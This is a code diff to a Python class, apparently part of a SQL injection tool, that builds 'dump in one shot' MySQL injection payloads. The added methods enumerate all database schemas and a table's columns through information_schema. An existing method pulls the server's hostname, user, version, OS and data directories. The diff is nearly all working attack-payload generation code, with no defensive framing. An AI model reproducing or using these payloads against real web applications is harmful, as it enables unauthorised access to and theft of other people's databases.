@@ -17,6 +17,7 @@ class Dios:
             column_query    = ''
 
             for column in columns:
+                column = column.strip(' ')
                 query           = "0x" + self.strTohex(f"<{column}>");
                 query           += f",{column},"
                 query           += "0x" + self.strTohex(f"</{column}>");
@@ -29,6 +30,16 @@ class Dios:
     def get_information(self,level=1):
         if level == 1:
             dios = f"(select+concat({self.startSQLi},(select+concat({self.hostname()},{self.port()},{self.user()},{self.version()},{self.database()},{self.os_version()},{self.mechine_version()},{self.base_dir()},{self.data_dir()},{self.ssl()},{self.openssl()},{self.symlink()},{self.socket()})),{self.endSQLi}))"
+        return dios
+
+    def show_columns(self, table_name, dbname, level=1):
+        if level == 1:
+            dios = f"(select+group_concat(column_name)+from+information_schema.columns+where+table_name=0x{self.strTohex(table_name)}+and+table_schema=0x{self.strTohex(dbname)})"
+        return dios
+    # Get all database
+    def databases(self, level=1):
+        if level == 1:
+            dios = f"(select+group_concat(DISTINCT(table_schema))+from+information_schema.columns)"
         return dios
 
 
